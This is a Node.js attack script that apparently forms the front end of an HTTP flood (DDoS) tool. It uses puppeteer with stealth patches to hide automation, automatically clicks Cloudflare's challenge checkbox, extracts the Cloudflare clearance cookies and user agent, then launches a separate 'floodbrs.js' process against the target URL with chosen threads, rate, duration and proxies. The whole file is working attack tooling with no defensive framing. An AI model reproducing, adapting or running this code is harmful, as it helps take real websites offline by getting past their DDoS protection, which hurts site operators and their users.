const fs = require('fs');
const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
const { spawn, exec } = require('child_process');

puppeteer.use(StealthPlugin());

const COLORS = {
    RED: '\x1b[31m',
    GREEN: '\x1b[32m',
    YELLOW: '\x1b[33m',
    BLUE: '\x1b[34m',
    RESET: '\x1b[0m'
};

// Enhanced stealth configuration
const applyStealth = async (page) => {
    await page.evaluateOnNewDocument(() => {
        Object.defineProperty(navigator, 'webdriver', { get: () => undefined });
        Object.defineProperty(navigator, 'plugins', {
            get: () => [
                {
                    name: 'Chrome PDF Plugin',
                    filename: 'internal-pdf-viewer',
                    description: 'Portable Document Format'
                }
            ]
        });
        
        Object.defineProperty(navigator, 'languages', {
            get: () => ['en-US', 'en']
        });

        window.chrome = {
            runtime: {},
            loadTimes: () => ({}),
            csi: () => ({}),
            app: { isInstalled: false }
        };

        delete window.__webdriver_evaluate;
        delete window.__selenium_evaluate;
        delete window.__webdriver_script_function;
    });
};

const getBrowserArgs = () => [
    '--no-sandbox',
    '--disable-setuid-sandbox',
    '--disable-dev-shm-usage',
    '--disable-accelerated-2d-canvas',
    '--disable-gpu',
    '--disable-blink-features=AutomationControlled',
    '--ignore-certificate-errors',
    '--ignore-ssl-errors',
    '--disable-web-security',
    '--disable-features=site-per-process',
    '--window-size=1920,1080'
];

// CLOUDFLARE SOLVER - SPECIFIC FOR CHECKBOX AFTER VERIFYING
const solveCloudflare = async (page, proxy, targetURL) => {
    log('INFO', `Processing ${maskProxy(proxy)}`, 'BLUE');
    
    // Wait for initial page load
    await sleep(3);
    
    let title = await page.title().catch(() => '');
    let currentUrl = page.url();
    
    // Check if already passed
    if (!title.includes('Just a moment') && !title.includes('Checking your browser')) {
        log('SUCCESS', 'Challenge passed', 'GREEN');
        return { solved: true };
    }

    log('INFO', 'Challenge detected - Title: ' + title, 'YELLOW');

    // PHASE 1: Wait for "Verifying..." phase (15 seconds)
    log('PHASE 1', 'Waiting for Verifying... (15 seconds)', 'BLUE');
    await sleep(15);

    // PHASE 2: Now look for the specific checkbox that appears
    log('PHASE 2', 'Looking for verification checkbox...', 'BLUE');
    
    let checkboxClicked = false;
    let maxWaitTime = 30000; // 30 seconds max wait for checkbox
    let startTime = Date.now();
    
    while (!checkboxClicked && (Date.now() - startTime) < maxWaitTime) {
        const frames = await page.frames();
        
        for (const frame of frames) {
            try {
                const frameUrl = frame.url();
                if (frameUrl.includes('challenges.cloudflare.com') || frameUrl.includes('/cdn-cgi/')) {
                    log('DEBUG', 'Found challenge frame', 'YELLOW');
                    
                    // Look for ANY checkbox element - broad search
                    const checkboxSelectors = [
                        'input[type="checkbox"]',
                        '[type="checkbox"]',
                        '.checkbox',
                        '.cf-challenge-checkbox',
                        '[role="checkbox"]',
                        '#checkbox',
                        '#cf-challenge-checkbox',
                        '.hcaptcha-checkbox',
                        '.recaptcha-checkbox',
                        '.challenge-form input',
                        '[aria-label*="checkbox"]',
                        '[id*="checkbox"]',
                        'div[class*="checkbox"]',
                        'span[class*="checkbox"]',
                        'label[class*="checkbox"]'
                    ];
                    
                    for (const selector of checkboxSelectors) {
                        try {
                            // Wait for selector with shorter timeout
                            await frame.waitForSelector(selector, { timeout: 2000 }).catch(() => {});
                            const elements = await frame.$$(selector);
                            
                            for (const element of elements) {
                                try {
                                    const isVisible = await element.isIntersectingViewport();
                                    const isEnabled = await element.isEnabled();
                                    
                                    if (isVisible && isEnabled) {
                                        log('SUCCESS', `Found checkbox with selector: ${selector}`, 'GREEN');
                                        
                                        // Get element info for debugging
                                        const elementInfo = await frame.evaluate(el => {
                                            return {
                                                tagName: el.tagName,
                                                className: el.className,
                                                id: el.id,
                                                type: el.type,
                                                role: el.getAttribute('role')
                                            };
                                        }, element);
                                        
                                        log('DEBUG', `Checkbox info: ${JSON.stringify(elementInfo)}`, 'YELLOW');
                                        
                                        // Click the checkbox
                                        await element.click({ delay: 100 });
                                        log('SUCCESS', 'Checkbox clicked successfully!', 'GREEN');
                                        checkboxClicked = true;
                                        
                                        // PHASE 3: Wait for redirect to main website
                                        log('PHASE 3', 'Waiting for redirect to main website (15 seconds)', 'BLUE');
                                        await sleep(15);
                                        
                                        // Check if we're on main website now
                                        title = await page.title().catch(() => '');
                                        if (!title.includes('Just a moment') && !title.includes('Checking your browser')) {
                                            log('SUCCESS', 'Successfully redirected to main website!', 'GREEN');
                                            return { solved: true };
                                        }
                                        break;
                                    }
                                } catch (error) {
                                    // Continue to next element
                                }
                            }
                            if (checkboxClicked) break;
                        } catch (error) {
                            // Continue to next selector
                        }
                    }
                    
                    // If no checkbox found, try to find any clickable element
                    if (!checkboxClicked) {
                        log('INFO', 'No checkbox found, looking for any clickable element...', 'YELLOW');
                        const clickableSelectors = [
                            'button',
                            'input[type="submit"]',
                            '.btn',
                            '.button',
                            '[role="button"]',
                            '[onclick]',
                            '.verify-btn',
                            '.success.button',
                            '.challenge-form button'
                        ];
                        
                        for (const selector of clickableSelectors) {
                            const elements = await frame.$$(selector);
                            for (const element of elements) {
                                const isVisible = await element.isIntersectingViewport();
                                if (isVisible) {
                                    await element.click({ delay: 100 }).catch(() => {});
                                    log('INFO', `Clicked element: ${selector}`, 'YELLOW');
                                    await sleep(15);
                                    
                                    title = await page.title().catch(() => '');
                                    if (!title.includes('Just a moment')) {
                                        log('SUCCESS', 'Click successful!', 'GREEN');
                                        return { solved: true };
                                    }
                                    break;
                                }
                            }
                        }
                    }
                    
                    break;
                }
            } catch (error) {
                // Continue to next frame
            }
        }
        
        // If checkbox not found yet, wait a bit and try again
        if (!checkboxClicked) {
            await sleep(2000);
            log('INFO', 'Still looking for checkbox...', 'YELLOW');
        }
    }

    // Final check
    title = await page.title().catch(() => '');
    if (!title.includes('Just a moment') && !title.includes('Checking your browser')) {
        log('SUCCESS', 'Challenge passed in final check', 'GREEN');
        return { solved: true };
    }

    log('ERROR', 'Failed to find and click checkbox', 'RED');
    return { solved: false };
};

// Extract Cloudflare cookies
const extractCookies = async (page, targetURL) => {
    await sleep(5);
    
    const allCookies = await page.cookies().catch(() => []);
    
    if (allCookies.length === 0) {
        log('COOKIES', 'No cookies found', 'YELLOW');
        return { cookies: '', count: 0, names: [] };
    }

    // Filter Cloudflare cookies
    const cloudflareCookies = allCookies.filter(cookie => 
        cookie.name.includes('cf_') ||
        cookie.name.includes('__cf') ||
        cookie.domain.includes('cloudflare')
    );

    log('COOKIES', `Total cookies found: ${allCookies.length}`, 'GREEN');
    
    if (cloudflareCookies.length > 0) {
        const cloudflareNames = cloudflareCookies.map(c => c.name).join(', ');
        log('COOKIES', `Cloudflare cookies: ${cloudflareNames}`, 'BLUE');
        
        const cookieString = cloudflareCookies.map(cookie => `${cookie.name}=${cookie.value}`).join('; ');
        return {
            cookies: cookieString,
            count: cloudflareCookies.length,
            names: cloudflareCookies.map(c => c.name)
        };
    } else {
        log('COOKIES', 'No Cloudflare cookies found', 'YELLOW');
        return { cookies: '', count: 0, names: [] };
    }
};

// Command-line setup
if (process.argv.length < 6) {
    console.log('Usage: node browser.js <targetURL> <threads> <proxyFile> <rate> <time>');
    console.log('Example: node browser.js https://example.com 2 proxies.txt 10 120');
    process.exit(1);
}

const targetURL = process.argv[2];
const threads = parseInt(process.argv[3]);
const proxyFile = process.argv[4];
const rate = process.argv[5];
const duration = parseInt(process.argv[6]);

let successCount = 0;

// Utility functions
const generateRandomString = (length) => {
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    return Array.from({ length }, () => chars[Math.floor(Math.random() * chars.length)]).join('');
};

const validKey = generateRandomString(12);

const readProxies = (filePath) => {
    try {
        const proxies = fs.readFileSync(filePath, 'utf8').trim().split(/\r?\n/).filter(Boolean);
        return [proxies[0]];
    } catch (error) {
        log('ERROR', 'Cannot read proxy file', 'RED');
        return [];
    }
};

const maskProxy = (proxy) => {
    const parts = proxy.split(':');
    if (parts.length >= 2) {
        const ip = parts[0];
        if (ip.split('.').length === 4) {
            return `${ip.split('.')[0]}.${ip.split('.')[1]}.**.**:****`;
        }
    }
    return proxy;
};

const log = (type, message, color = 'RESET') => {
    const colorCode = COLORS[color] || COLORS.RESET;
    console.log(`${colorCode}[${type}] ${message}${COLORS.RESET}`);
};

const sleep = (seconds) => new Promise(resolve => setTimeout(resolve, seconds * 1000));

const randomElement = (array) => array[Math.floor(Math.random() * array.length)];

// User agents
const userAgents = [
    `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36`,
    `Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36`
];

// Browser launcher
const launchBrowser = async (targetURL, proxy, attempt = 1) => {
    const userAgent = randomElement(userAgents);
    let browser;

    const options = {
        headless: true,
        args: [
            `--user-agent=${userAgent}`,
            ...getBrowserArgs()
        ],
        defaultViewport: { 
            width: 1920, 
            height: 1080 
        },
        ignoreHTTPSErrors: true
    };

    try {
        log('LAUNCH', `Attempt ${attempt} for ${maskProxy(proxy)}`, 'BLUE');
        
        browser = await puppeteer.launch(options);
        const [page] = await browser.pages();

        await applyStealth(page);

        log('NAVIGATE', `Going to: ${targetURL}`, 'BLUE');
        
        // Navigate to target
        await page.goto(targetURL, { 
            waitUntil: 'networkidle0', 
            timeout: 60000 
        }).catch(() => {});

        // Solve Cloudflare challenge
        const solveResult = await solveCloudflare(page, proxy, targetURL);
        
        if (!solveResult.solved) {
            throw new Error('Cloudflare challenge failed');
        }

        // Extract cookies
        const cookieResult = await extractCookies(page, targetURL);
        
        successCount++;
        
        if (cookieResult.count > 0) {
            log('SUCCESS', `Solved! Cloudflare cookies: ${cookieResult.count} (${cookieResult.names.join(', ')})`, 'GREEN');
        } else {
            log('WARNING', 'Solved but no Cloudflare cookies found', 'YELLOW');
        }

        await browser.close();

        return {
            cookies: cookieResult.cookies,
            userAgent: userAgent,
            cookieCount: cookieResult.count,
            cookieNames: cookieResult.names
        };

    } catch (error) {
        if (browser) await browser.close().catch(() => {});
        
        if (attempt < 3) {
            log('RETRY', `Retrying ${maskProxy(proxy)} (${attempt}/3)`, 'YELLOW');
            await sleep(8);
            return launchBrowser(targetURL, proxy, attempt + 1);
        }
        
        log('FAILED', `${maskProxy(proxy)} - ${error.message}`, 'RED');
        return null;
    }
};

// Main execution
const main = async () => {
    const proxies = readProxies(proxyFile);
    
    if (proxies.length === 0) {
        log('ERROR', 'No proxies found', 'RED');
        process.exit(1);
    }

    log('START', `Target: ${targetURL}`, 'GREEN');
    log('INFO', `Using 1 proxy for testing | Threads: ${threads} | Time: ${duration}s`, 'BLUE');

    // Process only the first proxy
    const proxy = proxies[0];
    
    try {
        const result = await launchBrowser(targetURL, proxy);
        
        if (result && result.cookies) {
            log('RESULT', `Proxy ${maskProxy(proxy)} - ${result.cookieCount} Cloudflare cookies`, 'GREEN');
            
            // Launch flood process with Cloudflare cookies
            try {
                log('FLOOD', `Starting flood process with ${threads} threads, rate ${rate} for ${duration}s`, 'GREEN');
                const floodProcess = spawn('node', [
                    'floodbrs.js',
                    targetURL,
                    duration.toString(),
                    rate,
                    threads.toString(),
                    proxyFile,
                    result.cookies,
                    result.userAgent,
                    validKey
                ], {
                    detached: false,
                    stdio: 'inherit'
                });
                
                floodProcess.on('close', (code) => {
                    log('FLOOD', `Process completed`, 'YELLOW');
                    process.exit(0);
                });
                
            } catch (error) {
                log('ERROR', `Failed to start flood: ${error.message}`, 'RED');
            }
        } else {
            log('ERROR', 'No Cloudflare cookies obtained', 'RED');
        }
    } catch (error) {
        log('ERROR', error.message, 'RED');
    }
};

// Error handling
process.on('uncaughtException', (error) => {
    log('ERROR', error.message, 'RED');
});

process.on('unhandledRejection', (error) => {
    log('ERROR', error.message, 'RED');
});

process.on('SIGINT', () => {
    log('INFO', 'Shutdown signal received', 'YELLOW');
    process.exit(0);
});

log('READY', 'Cloudflare Checkbox Solver - Waiting for Verification then Clicking Checkbox', 'GREEN');
main().catch(error => {
    log('ERROR', error.message, 'RED');
    process.exit(1);
});
